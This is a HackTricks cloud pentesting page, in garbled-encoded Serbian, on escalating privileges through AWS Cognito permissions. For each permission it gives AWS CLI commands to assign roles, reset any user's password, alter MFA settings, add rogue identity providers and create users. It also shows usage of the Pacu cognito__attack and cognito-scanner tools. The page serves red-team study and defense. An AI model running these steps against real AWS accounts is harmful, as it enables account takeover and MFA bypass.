# AWS - Cognito Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Cognito

Za vi코e informacija o Cognitu proverite:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Prikupljanje kredencijala iz Identity Pool-a

Po코to Cognito mo쬰 dodeliti **IAM role credentials** kako **autentifikovanim** tako i **neautentifikovanim** **korisnicima**, ako prona캠ete **Identity Pool ID** aplikacije (trebalo bi da bude hardkodiran u njoj) mo쬰te dobiti nove kredencijale i tako privesc (unutar AWS naloga gde verovatno niste imali nikakve kredencijale ranije).

Za vi코e informacija [**proverite ovu stranicu**](../aws-unauthenticated-enum-access/#cognito).

**Potencijalni uticaj:** Direktan privesc na usluge ulogu povezanu sa neautentifikovanim korisnicima (i verovatno na onu povezanu sa autentifikovanim korisnicima).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Sa ovom dozvolom mo쬰te **dodeliti bilo koju cognito ulogu** autentifikovanim/neautentifikovanim korisnicima cognito aplikacije.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374"
```
Ako cognito aplikacija **nema omogu캖ene neautentifikovane korisnike**, mo쬯a 캖e vam biti potrebna i dozvola `cognito-identity:UpdateIdentityPool` da je omogu캖ite.

**Potencijalni uticaj:** Direktno privilegijsko eskaliranje na bilo koju cognito ulogu.

### `cognito-identity:update-identity-pool`

Napada캜 sa ovom dozvolom mogao bi, na primer, da postavi Cognito User Pool pod njegovom kontrolom ili bilo kog drugog provajdera identiteta gde mo쬰 da se prijavi kao **na캜in za pristup ovoj Cognito Identity Pool**. Tada, samo **prijavljivanje** na tom provajderu korisnika 캖e **omogu캖iti mu pristup konfigurisanom autentifikovanom ulozi u Identity Pool**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Tako캠e je mogu캖e **zloupotrebiti ovu dozvolu da se omogu캖i osnovna autentifikacija**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potencijalni uticaj**: Kompromitovanje konfigurisane autentifikovane IAM uloge unutar identitetskog bazena.

### `cognito-idp:AdminAddUserToGroup`

Ova dozvola omogu캖ava **dodavanje Cognito korisnika u Cognito grupu**, stoga bi napada캜 mogao zloupotrebiti ovu dozvolu da doda korisnika pod njegovom kontrolom u druge grupe sa **boljim** privilegijama ili **razli캜itim IAM ulogama**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potencijalni Uticaj:** Privesc na druge Cognito grupe i IAM uloge povezane sa User Pool Grupama.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Napada캜 sa ovim dozvolama mo쬰 **kreirati/aktuelizovati grupe** sa **svakom IAM ulogom koja mo쬰 biti kori코캖ena od strane kompromitovanog Cognito Identity Providera** i u캜initi kompromitovanog korisnika delom grupe, pristupaju캖i svim tim ulogama:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Potencijalni uticaj:** Privesc na druge Cognito IAM uloge.

### `cognito-idp:AdminConfirmSignUp`

Ova dozvola omogu캖ava **verifikaciju registracije**. Po defaultu, svako mo쬰 da se prijavi na Cognito aplikacije; ako to ostane, korisnik bi mogao da kreira nalog sa bilo kojim podacima i verifikuje ga ovom dozvolom.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potencijalni uticaj:** Indirektni privesc na IAM ulogu identiteta za autentifikovane korisnike ako mo쬰te registrovati novog korisnika. Indirektni privesc na druge funkcionalnosti aplikacije omogu캖avaju캖i potvrdu bilo kog naloga.

### `cognito-idp:AdminCreateUser`

Ova dozvola bi omogu캖ila napada캜u da kreira novog korisnika unutar korisni캜kog bazena. Novi korisnik se kreira kao omogu캖en, ali 캖e morati da promeni svoju lozinku.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potencijalni uticaj:** Direktno privesc na IAM ulogu identiteta za autentifikovane korisnike. Indirektno privesc na druge funkcionalnosti aplikacije omogu캖avaju캖i kreiranje bilo kog korisnika.

### `cognito-idp:AdminEnableUser`

Ova dozvola mo쬰 pomo캖i u veoma specifi캜nom scenariju gde je napada캜 prona코ao akreditive onemogu캖enog korisnika i treba da ga **ponovo omogu캖i**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potencijalni uticaj:** Indirektno privesc na IAM ulogu identiteta za autentifikovane korisnike i dozvole korisnika ako je napada캜 imao akreditive za onemogu캖enog korisnika.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Ova dozvola omogu캖ava prijavu putem [**metode ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Za vi코e informacija pratite link.

### `cognito-idp:AdminSetUserPassword`

Ova dozvola bi omogu캖ila napada캜u da **promeni lozinku bilo kog korisnika**, omogu캖avaju캖i mu da se la쬹o predstavi kao bilo koji korisnik (koji nema omogu캖enu MFA).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potencijalni uticaj:** Direktno privesc za potencijalno bilo kog korisnika, tako da pristup svim grupama 캜iji je korisnik 캜lan i pristup IAM ulozi autentifikovanog Identity Pool-a.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Napada캜 bi potencijalno mogao da zloupotrebi ovu dozvolu da postavi mobilni telefon pod njegovom kontrolom kao **SMS MFA korisnika**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Sli캜no prethodnom, ova dozvola se mo쬰 koristiti za postavljanje MFA preferencija korisnika kako bi se zaobi코la MFA za코tita.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Sli캜no prethodnom, ova dozvola se mo쬰 koristiti za postavljanje MFA preferencija korisni캜kog bazena kako bi se zaobi코la MFA za코tita.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Tako캠e je mogu캖e a쬿rirati korisni캜ki bazen kako bi se promenila MFA politika. [Proverite cli ovde](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potential Impact:** Indirektno privesc potencijalno bilo kojem korisniku 캜ije napredne podatke napada캜 poznaje, ovo bi moglo omogu캖iti zaobila쬰nje MFA za코tite.

### `cognito-idp:AdminUpdateUserAttributes`

Napada캜 sa ovom dozvolom mogao bi promeniti email ili broj telefona ili bilo koju drugu atribut korisnika pod njegovom kontrolom kako bi poku코ao da dobije vi코e privilegija u osnovnoj aplikaciji.\
Ovo omogu캖ava promenu emaila ili broja telefona i postavljanje kao verifikovanog.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potencijalni uticaj:** Potencijalni indirektni privesc u osnovnoj aplikaciji koriste캖i Cognito User Pool koji daje privilegije na osnovu atributa korisnika.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Napada캜 sa ovom dozvolom mogao bi **da kreira novog User Pool Client-a koji je manje restriktivan** od ve캖 postoje캖ih pool klijenata. Na primer, novi klijent bi mogao da dozvoli bilo koju vrstu metode za autentifikaciju, da nema nikakvu tajnu, da ima onemogu캖enu revokaciju tokena, da dozvoli tokenima da budu validni du쬴 period...

Isto se mo쬰 uraditi ako se umesto kreiranja novog klijenta, **izmenjuje postoje캖i**.

U [**komandnoj liniji**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (ili [**a쬿riranoj**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) mo쬰te videti sve opcije, proverite to!
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potencijalni uticaj:** Potencijalni indirektni privesc za autorizovanog korisnika Identity Pool-a koji koristi User Pool tako 코to se kreira novi klijent koji opu코ta bezbednosne mere i omogu캖ava napada캜u da se prijavi sa korisnikom kojeg je mogao da kreira.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Napada캜 bi mogao da zloupotrebi ovu dozvolu da kreira korisnike u캜itavanjem csv datoteke sa novim korisnicima.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
(U slu캜aju kada kreirate novi posao za uvoz, mo쬯a 캖e vam biti potrebna iam passrole dozvola, jo코 nisam testirao).

**Potencijalni uticaj:** Direktan privesc na IAM ulogu identitetskog bazena za autentifikovane korisnike. Indirektan privesc na druge funkcionalnosti aplikacije omogu캖avaju캖i kreiranje bilo kog korisnika.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Napada캜 bi mogao da kreira novog provajdera identiteta kako bi mogao da **prijavi se preko ovog provajdera**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potencijalni Uticaj:** Direktno privesc na IAM ulogu identiteta za autentifikovane korisnike. Indirektno privesc na druge funkcionalnosti aplikacije omogu캖avaju캖i kreiranje bilo kog korisnika.

### cognito-sync:\* Analiza

Ovo je veoma uobi캜ajena dozvola po defaultu u ulogama Cognito Identity Pools. 캛ak i ako wildcard u dozvolama uvek izgleda lo코e (posebno dolaze캖i iz AWS-a), **date dozvole nisu super korisne iz perspektive napada캜a**.

Ova dozvola omogu캖ava 캜itanje informacija o korisnicima iz Identity Pools i Identity IDs unutar Identity Pools (코to nije osetljiva informacija).\
Identity IDs mogu imati [**Datasets**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) dodeljene njima, koje su informacije o sesijama (AWS to defini코e kao **sa캜uvanu igru**). Mogu캖e je da ovo sadr쬴 neku vrstu osetljivih informacija (ali je verovatno캖a prili캜no niska). Mo쬰te prona캖i na [**stranici za enumeraciju**](../aws-services/aws-cognito-enum/) kako da pristupite ovim informacijama.

Napada캜 bi tako캠e mogao koristiti ove dozvole da **prijavi sebe na Cognito stream koji objavljuje promene** na ovim datasetima ili **lambda koja se aktivira na cognito doga캠aje**. Nisam video da se ovo koristi, i ne bih o캜ekivao osetljive informacije ovde, ali nije nemogu캖e.

### Automatski Alati

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), AWS framework za eksploataciju, sada uklju캜uje module "cognito\_\_enum" i "cognito\_\_attack" koji automatizuju enumeraciju svih Cognito resursa u nalogu i ozna캜avaju slabe konfiguracije, atribute korisnika kori코캖ene za kontrolu pristupa, itd., i tako캠e automatizuju kreiranje korisnika (uklju캜uju캖i podr코ku za MFA) i privilegiju eskalaciju na osnovu modifikovanih prilago캠enih atributa, upotrebljivih kredencijala identiteta, preuzimljivih uloga u id tokenima, itd.

Za opis funkcija modula pogledajte deo 2 [blog posta](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Za uputstva za instalaciju pogledajte glavnu [Pacu](https://github.com/RhinoSecurityLabs/pacu) stranicu.

#### Kori코캖enje

Primer kori코캖enja cognito\_\_attack za poku코aj kreiranja korisnika i svih privesc vektora protiv datog identiteta i korisni캜kog klijenta:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Primer kori코캖enja cognito\_\_enum za prikupljanje svih korisni캜kih bazena, klijenata korisni캜kih bazena, identitetskih bazena, korisnika itd. vidljivih u trenutnom AWS nalogu:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) je CLI alat u pythonu koji implementira razli캜ite napade na Cognito, uklju캜uju캖i eskalaciju privilegija.

#### Instalacija
```bash
$ pip install cognito-scanner
```
#### Kori코캖enje
```bash
$ cognito-scanner --help
```
Za vi코e informacija proverite [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
